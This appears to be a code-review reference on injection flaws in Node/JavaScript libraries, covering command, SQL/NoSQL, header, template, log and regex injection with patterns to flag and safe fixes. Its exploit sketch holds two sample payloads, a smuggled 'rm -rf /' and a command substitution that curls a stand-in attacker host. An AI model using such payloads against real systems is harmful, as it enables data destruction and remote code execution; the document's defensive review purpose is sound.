# Injection

Covers command, SQL, NoSQL, header, template, and log injection. The common root is: untrusted input gets concatenated into a structured string that a downstream interpreter then parses.

## Command injection (Node)

### Patterns to flag

- `child_process.exec(cmd)` or `execSync(cmd)` where `cmd` is built from user input. `exec` uses a shell — any shell metacharacter in `cmd` is interpreted. This is the canonical mistake.
- `child_process.spawn(bin, args, { shell: true })` — same risk as `exec`.
- `execFile(bin, args)` with `args` containing a string that itself contains shell metachars. `execFile` without a shell *is* safe for metachars, but flag if an arg itself is parsed by the target binary as a mini-shell (e.g., `-c`, `--eval`).
- Any use of `/bin/sh`, `/bin/bash`, `cmd.exe` explicitly in the argv.

### Safe primitives

- `spawn(bin, [...args], { shell: false })` with a fixed `bin` and an array of args. No shell parsing.
- `execFile(bin, [...args])` for simple cases.
- For chained commands, use sequential spawns, not `&&` in a string.

### Platform traps

- On Windows, `spawn` without `shell: true` still invokes `CreateProcess`, which has its own argument parsing quirks (batch files, `cmd.exe`). If the binary is `.bat` or `.cmd`, Node historically required `shell: true` — this was patched in recent versions, but libraries targeting older Node should spawn the interpreter explicitly.
- `PATH` lookup without absolute paths can be hijacked by a malicious cwd on Windows. Prefer absolute paths or a whitelist.

### Quick exploit sketch template

```ts
lib.runTool("; rm -rf / #");
// or
lib.runTool("$(curl attacker.example/x)");
```

## SQL / NoSQL / query injection

### Patterns to flag

- Template-literal or string-concat SQL: `` `SELECT * FROM u WHERE id = ${id}` ``
- `.raw(...)` / `.query(string, [...])` where the string is built from input (parameter placeholders are fine, *string concatenation before binding* is not)
- MongoDB: `db.collection.find({ user: req.body.user })` where `req.body.user` can be an object like `{ $ne: null }`. Always coerce to string (or validate shape).
- Any ORM's "unsafe raw" escape hatch (`Prisma.$queryRawUnsafe`, `knex.raw`, `sequelize.query` without replacements).

### Safe primitives

- Parameterized queries, end of story.
- For `ORDER BY`, column names, and identifiers — parameters don't bind. Use a strict allowlist.
- MongoDB: explicitly wrap or validate object-typed fields. For anything that should be a string, assert `typeof x === "string"`.

## Header injection

### Patterns to flag

- `res.setHeader(name, value)` or equivalent where `value` contains caller input without `\r\n` stripping.
- HTTP clients that construct headers from input: `fetch(url, { headers: { "X-Thing": userInput } })`.
- Cookie construction by string concat instead of a cookie-serializer.
- SMTP / email libraries: Subject, From, To built from input without CRLF filtering → header injection to add Bcc, etc.

### Safe primitives

- Node's `http.ServerResponse.setHeader` rejects `\r` / `\n` in values since Node 10ish, but old polyfills don't. Confirm the library isn't routing through a polyfill.
- Cookie construction: `cookie.serialize(name, value, opts)` from the `cookie` package, which encodes correctly.
- Always strip `\r\n\0` from any field that becomes a header.

## Template injection

### Patterns to flag

- Template engines (`ejs`, `pug`, `handlebars`, `nunjucks`) rendering a template string that is built from input. The template *source* is a trust boundary, not the data passed to it.
- `new Function("return `" + userTemplate + "`")` — don't.
- Vue/JSX-like "string as template" patterns where the string comes from input.

### Safe primitives

- Separate template *source* (trusted) from template *data* (untrusted). Data is fine to pass; source never comes from input.
- If you need user-defined templates, use a sandboxed template language (Handlebars with the `noEscape: false` default and no custom helpers bound to globals). Document the threat model.

## Log injection and log forging

### Patterns to flag

- `logger.info("user " + name)` where `name` can contain `\n` → attacker forges log lines, poisoning log parsers or SIEM rules.
- Logging full stack traces that include untrusted error messages (`err.message`) into structured loggers that interpret `\n`.

### Safe primitives

- Structured logging (`logger.info({ user: name }, "login")`) that serializes to JSON — `\n` becomes `\\n`.
- If you must use string logs, strip or escape control characters from inputs before formatting.

## Regex (non-ReDoS) injection

### Patterns to flag

- `new RegExp(pattern)` where `pattern` comes from input. ReDoS is covered in `redos.md` — the injection angle here is *meaning manipulation*: user supplies a pattern that matches things the caller didn't intend. Example: a library that takes a "filter pattern" from config and uses it against asset paths — a crafted pattern can leak data.

### Safe primitives

- Don't accept user-supplied regex at all if you can avoid it; accept a subset grammar (globs, wildcards) and compile server-side.
- If you must accept regex, bound it with `RegExp.prototype.source.length` and reject unbounded quantifiers.

## Format-string and interpolation

JS doesn't have printf-family format strings at the language level, but:

- `String.prototype.replace(pattern, replacement)` with `replacement` from input: `$&`, `$'`, `$\`` are interpreted. Use a replacement *function* if you need literal behavior.
- `util.format` in Node with `%s`, `%d`, etc. — if the format string itself comes from input, the attacker controls what gets expanded. Flag any `util.format(userFormat, ...safeArgs)`.

## Finding wording templates

For a command injection finding, your *What* sentence should read like:

> `runTool` passes its `name` argument to `child_process.exec`, which evaluates its argument through `/bin/sh`.

Your *Why it matters* should name the documented API path:

> `runTool` is documented as accepting a build-target name. A caller passing adversarial input — or any caller that forwards attacker-influenced data — achieves arbitrary shell execution in the Node process.

The *Patch* is almost always: swap `exec` for `execFile` or `spawn` with `shell: false`, and pass arguments as an array.
